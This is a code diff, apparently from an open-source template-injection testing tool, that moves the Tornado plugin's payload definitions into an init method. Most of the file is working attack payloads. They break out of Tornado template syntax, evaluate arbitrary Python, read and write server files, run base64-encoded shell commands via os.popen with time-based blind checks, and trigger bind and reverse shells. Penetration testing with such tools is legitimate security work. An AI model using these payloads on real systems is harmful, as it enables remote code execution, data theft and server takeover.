@@ -5,79 +5,81 @@ from utils import rand
 import re
 
 class Tornado(Plugin):
+    
+    def init(self):
 
-    actions = {
-        'render' : {
-            'render': '{{%(code)s}}',
-            'header': '{{%(header)s}}',
-            'trailer': '{{%(trailer)s}}',
-            'render_test': """'%(s1)s'}}{%% raw '%(s1)s'.join('%(s2)s') %%}{{'%(s2)s'""" % { 
-                's1' : rand.randstrings[0], 
-                's2' : rand.randstrings[1]
+        self.update_actions({
+            'render' : {
+                'render': '{{%(code)s}}',
+                'header': '{{%(header)s}}',
+                'trailer': '{{%(trailer)s}}',
+                'render_test': """'%(s1)s'}}{%% raw '%(s1)s'.join('%(s2)s') %%}{{'%(s2)s'""" % { 
+                    's1' : rand.randstrings[0], 
+                    's2' : rand.randstrings[1]
+                },
+                'render_expected': '%(res)s' % { 
+                    'res' : rand.randstrings[0] + rand.randstrings[0].join(rand.randstrings[1]) + rand.randstrings[1]
+                }
             },
-            'render_expected': '%(res)s' % { 
-                'res' : rand.randstrings[0] + rand.randstrings[0].join(rand.randstrings[1]) + rand.randstrings[1]
+            'write' : {
+                'call' : 'evaluate',
+                'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
+                'truncate' : """open("%(path)s", 'w').close()"""
+            },
+            'read' : {
+                'call': 'evaluate',
+                'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
+            },
+            'md5' : {
+                'call': 'evaluate',
+                'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
+            },
+            'evaluate' : {
+                'call': 'render',
+                'evaluate': '{{ %(code)s }}'
+            },
+            'blind' : {
+                'call': 'evaluate_blind',
+                'bool_true' : '"a".join("ab") == "aab"',
+                'bool_false' : 'False'
+            },
+            'evaluate_blind' : {
+                'call': 'evaluate',
+                'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
+            },
+            'bind_shell' : {
+                'call' : 'execute_blind',
+                'bind_shell': languages.bash_bind_shell
+            },
+            'reverse_shell' : {
+                'call': 'execute_blind',
+                'reverse_shell' : languages.bash_reverse_shell
+            },
+            'execute_blind' : {
+                'call': 'evaluate_blind',
+                'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
+            },
+            'execute' : {
+                'call' : 'evaluate',
+                'execute' : """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
             }
-        },
-        'write' : {
-            'call' : 'evaluate',
-            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
-            'truncate' : """open("%(path)s", 'w').close()"""
-        },
-        'read' : {
-            'call': 'evaluate',
-            'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
-        },
-        'md5' : {
-            'call': 'evaluate',
-            'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
-        },
-        'evaluate' : {
-            'call': 'render',
-            'evaluate': '{{ %(code)s }}'
-        },
-        'blind' : {
-            'call': 'evaluate_blind',
-            'bool_true' : '"a".join("ab") == "aab"',
-            'bool_false' : 'False'
-        },
-        'evaluate_blind' : {
-            'call': 'evaluate',
-            'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
-        },
-        'bind_shell' : {
-            'call' : 'execute_blind',
-            'bind_shell': languages.bash_bind_shell
-        },
-        'reverse_shell' : {
-            'call': 'execute_blind',
-            'reverse_shell' : languages.bash_reverse_shell
-        },
-        'execute_blind' : {
-            'call': 'evaluate_blind',
-            'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
-        },
-        'execute' : {
-            'call' : 'evaluate',
-            'execute' : """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
-        }
 
-    }
+        })
 
-    contexts = [
+        self.set_contexts([
 
-        # Text context, no closures
-        { 'level': 0 },
-        
-        # This covers {{%s}}
-        { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : languages.python_ctx_closures },
+            # Text context, no closures
+            { 'level': 0 },
+            
+            # This covers {{%s}}
+            { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : languages.python_ctx_closures },
 
-        # This covers {% %s %}
-        { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : languages.python_ctx_closures },
+            # This covers {% %s %}
+            { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : languages.python_ctx_closures },
 
-        # Comment blocks
-        { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },
-    ]
+            # Comment blocks
+            { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },
+    ])
 
     language = 'python'
 
